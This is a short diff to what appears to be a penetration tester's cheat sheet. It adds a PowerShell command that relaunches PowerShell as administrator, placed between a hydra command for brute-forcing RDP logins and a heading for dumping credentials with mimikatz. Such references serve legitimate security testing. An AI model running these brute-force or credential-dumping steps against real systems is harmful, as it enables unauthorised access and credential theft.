@@ -222,6 +222,13 @@ Brute force RDP:
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
 ```
 
+Elevate powershell to administrator:
+#elevate-powershell #powershell-admin
+
+```powershell
+Start-Process powershell -Verb runas -ArgumentList "-NoExit -c cd '$pwd'"
+```
+
 mimikatz dump as local admin:
 #dump #mimikatz
 ```powershell
